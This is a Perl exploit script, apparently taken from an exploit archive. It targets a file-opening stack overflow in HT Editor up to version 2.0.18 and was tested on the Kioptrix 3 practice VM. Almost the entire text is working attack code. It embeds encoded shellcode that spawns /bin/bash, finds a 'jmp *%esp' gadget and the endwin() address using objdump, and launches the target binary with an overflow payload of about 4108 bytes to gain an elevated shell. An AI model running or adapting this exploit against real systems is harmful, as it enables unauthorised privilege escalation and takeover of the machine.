# Exploit Title: HT Editor File openning Stack Overflow 
# Author: ZadYree changed by Diego Albuquerque aka Tch4kra
# Version: <= 2.0.18
# Tested on: Linux (kioptrix 3)

# For original version - https://www.exploit-db.com/exploits/17083

# Please change $namez if necessary!

#!/usr/bin/perl

my ($esp, $retaddr);
my $scz = 	[	"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e" .
				"\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8" .
				"\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67" .
				"\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30" .
				"\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4" .
				"\x53\x52\x54\x8a\xe2\xce\x81",
				"\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b" .
				"\x08\x89\x43\x0c\x50\x8d\x53\x08\x52\x53" .
				"\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff" .
				"/bin/bash"	];

print '[*]Looking for $esp and endwin()...\n';

#Change the HT binary location. 
#on kioptrix 3 = /usr/local/bin/ht
my $namez = [qw#/usr/local/bin/ht#];

my $infos = get_infos(qx{uname});

my $name = $infos->[0];


print '[+]endwin() address found! (0x', $infos->[3],')\n';

for my $line(qx{objdump -D $name | grep "ff e4"}) {
	$esp = "0" . $1, last if ($line =~ m{([a-f0-9]{7}).+jmp\s{4}\*%esp});
}

print '[+]$esp place found! (0x', $esp, ")\012Now exploiting...\n";

my @payload = ($infos->[0], ("A" x ($infos->[1] - length(qx{pwd}))) . reverse(pack('H*', $infos->[3])) . reverse(pack('H*', $esp)) . $infos->[2]);
exec(@payload);

sub get_infos {
	return([$namez->[0], 4108, $scz->[0], getendwin("linux")]);
}

sub getendwin {
	my $n = $namez->[0];
	for (qx{objdump -d $n | grep endwin}) {
		$retaddr = $1, last if ($_ =~ m{(.*) <});
	}
	return($retaddr);
}